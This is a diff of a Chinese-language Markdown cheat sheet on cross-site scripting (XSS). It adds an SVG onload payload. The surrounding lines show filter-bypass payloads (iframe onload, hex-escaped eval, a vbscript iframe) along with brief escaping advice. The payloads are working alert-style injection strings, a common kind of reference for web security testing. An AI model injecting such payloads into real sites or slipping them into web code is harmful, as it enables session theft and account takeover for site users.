@@ -3,7 +3,7 @@ title: "XSS"
 date: 2016-01-20 21:38
 ---
 
-## 0x01 xss cheat sheet
+## xss cheat sheet
 
 xss cheat sheet 即测试xss的测试样表
 
@@ -20,15 +20,24 @@ xss cheat sheet 即测试xss的测试样表
 <iframe onload="alert(1)"></iframe>
 ```
 
-## 0x02 xss 过滤绕过
+## xss payload 收集
 
-* <> 
+### svg
+
+```
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+```
+
+
+## xss 过滤绕过
+
+* <>
 
 ```
 <scirpt>alert(1);</script>
 ```
 
-对 <> 或 < script > 进行过滤或转义，可以防御此类xss 
+对 <> 或 < script > 进行过滤或转义，可以防御此类xss
 
 * HTML标签属性执行XSS
 
@@ -114,7 +123,7 @@ Tab(&#9), 换行符(&#10), 空格(&#32)可以被插入到代码中任意地方�
 **防御：**
 
 ```
-&过滤为 &amp; 
+&过滤为 &amp;
 ```
 
 * 产生自己的事件
@@ -235,7 +244,7 @@ eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29");
 * IE下vbscript执行代码
 
 ```
-<iframe src="vbscript:msgbox(1)"></iframe> 
+<iframe src="vbscript:msgbox(1)"></iframe>
 ```
 
 ## 0x06 flash
